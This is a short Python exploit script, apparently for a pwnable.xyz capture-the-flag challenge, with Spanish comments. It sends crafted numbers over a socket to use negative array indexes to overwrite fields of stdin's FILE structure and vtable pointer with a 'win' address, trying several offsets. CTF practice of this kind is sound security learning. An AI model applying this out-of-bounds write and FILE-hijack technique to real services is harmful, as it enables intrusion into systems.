#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

# _IO_FILE structure (aproximada):
# offset 0: _flags (4 bytes)
# offset 8: _IO_read_ptr
# offset 16: _IO_read_end
# offset 24: _IO_read_base
# ...
# offset 184-215: cerca del final

# stdin base: 0x202100
# result base: 0x202200

# result[-9] = 0x2021b8 = stdin + 184
# result[-8] = 0x2021c0 = stdin + 192  
# result[-7] = 0x2021c8 = stdin + 200
# result[-6] = 0x2021d0 = stdin + 208
# result[-5] = 0x2021d8 = stdin + 216 (vtable - 8)
# result[-4] = 0x2021e0 = vtable pointer

win = 0xa21

# Probar diferentes offsets para ver cuál causa comportamiento interesante
for test_offset in [-9, -8, -7, -6]:
    print(f"\n{'='*60}")
    print(f"Probando offset {test_offset}")
    print('='*60)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((host, port))
        
        banner = s.recv(1024)
        print(f"Conectado")
        
        # Sobrescribir con win
        b = abs(test_offset) * 0x12345
        a = win ^ b
        payload = f"{a} {b} {test_offset}\n"
        s.sendall(payload.encode())
        
        time.sleep(0.5)
        resp = s.recv(2048)
        print(f"Resp1: {resp.decode().strip()}")
        
        # Intentar otro input
        s.sendall(b"1 2 3\n")
        time.sleep(0.5)
        resp2 = s.recv(2048)
        print(f"Resp2: {resp2.decode().strip()}")
        
        # Probar triggerar algo
        s.sendall(b"5 5 5\n")
        time.sleep(1)
        resp3 = s.recv(4096)
        if resp3:
            print(f"Resp3: {resp3.decode()}")
            
        s.close()
        time.sleep(2)
        
    except Exception as e:
        print(f"Error/Crash: {e}")
        time.sleep(3)